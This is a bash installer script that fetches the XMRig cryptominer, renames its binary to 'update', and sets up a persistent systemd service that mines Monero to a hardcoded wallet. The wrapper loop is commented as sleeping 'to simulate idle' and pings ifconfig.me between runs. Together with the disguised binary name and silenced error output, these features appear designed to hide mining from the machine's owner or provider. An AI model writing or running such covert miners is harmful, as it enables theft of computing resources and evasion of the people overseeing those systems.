#!/bin/bash

# Usage: bash <(curl -s https://raw.githubusercontent.com/YourUser/YourRepo/main/install.sh) v7

set -e

WORKER="$1"
if [ -z "$WORKER" ]; then
  echo "❌ Please provide a worker name (e.g. v7)"
  exit 1
fi

echo "🔓 Unlocking any locked files..."
exec 2>/dev/null
ulimit -n 1048576 || true
ulimit -u unlimited || true

echo "📦 Installing required packages..."
apt-get update -y || true
apt-get install -y curl tar tmux sudo git wget unzip jq libhwloc-dev screen net-tools -qq || true

echo "📁 Creating directories..."
mkdir -p /root/Documents/build
cd /root/Documents/build || exit 1

echo "🧹 Cleaning old files..."
rm -rf * || true

echo "⬇️ Fetching latest XMRig..."
VERSION=$(curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest | jq -r '.tag_name')
URL="https://github.com/xmrig/xmrig/releases/download/${VERSION}/xmrig-${VERSION}-linux-x64.tar.gz"

curl -L "$URL" -o xmrig.tar.gz || { echo "❌ Failed to download XMRig"; exit 1; }
tar -xf xmrig.tar.gz || { echo "❌ Failed to extract XMRig"; exit 1; }

FOUND_BIN=$(find . -type f -name "xmrig" | head -n 1)
if [ ! -f "$FOUND_BIN" ]; then
  echo "❌ XMRig binary not found"
  exit 1
fi

mv "$FOUND_BIN" update
chmod +x update

echo "🛠️ Creating wrapper script..."
cat <<EOF > /root/runner.sh
#!/bin/bash
while true; do
  echo "[🔄] Starting mining..."
  /root/Documents/build/update -o pool.supportxmr.com:443 -u 84QEvQ9V25mUNDiMXmq1aF96FwpzDPg4R1d564MjhvxrNpz7rizA3Q3FUowb83rsBK8P9DnDQnk4hTED57Ycd4p1Q8uRzZz -p x --tls --coin monero -k --cpu-priority=5 --rig-id=$WORKER

  echo "[😴] Sleeping to simulate idle..."
  for i in {1..10}; do
    curl -s https://ifconfig.me > /dev/null
    sleep 12
  done
done
EOF

chmod +x /root/runner.sh

echo "🧩 Creating systemd service..."
cat <<EOF > /etc/systemd/system/xmrig-wrapper.service
[Unit]
Description=XMRig Miner Wrapper
After=network.target

[Service]
ExecStart=/usr/bin/tmux new-session -d -s miner '/root/runner.sh'
Restart=always
RestartSec=5s

[Install]
WantedBy=multi-user.target
EOF

echo "📶 Enabling systemd service..."
systemctl daemon-reexec || true
systemctl daemon-reload || true
systemctl enable xmrig-wrapper.service || true
systemctl start xmrig-wrapper.service || true

STATUS=$(systemctl is-active xmrig-wrapper.service)

echo "=========================================="
echo "✅ Miner $WORKER is configured and running"
echo "🛠️  Binary: /root/Documents/build/update"
echo "📝 Logs: /root/desktop.log"
echo "📦 Service: xmrig-wrapper [Status: $STATUS]"
echo "🔁 Restart: sudo systemctl restart xmrig-wrapper"
echo "🛑 Stop:    sudo systemctl stop xmrig-wrapper"
echo "🔍 Logs:    tail -f /root/desktop.log"
echo "🧠 Tmux:    tmux attach-session -t miner"
echo "=========================================="
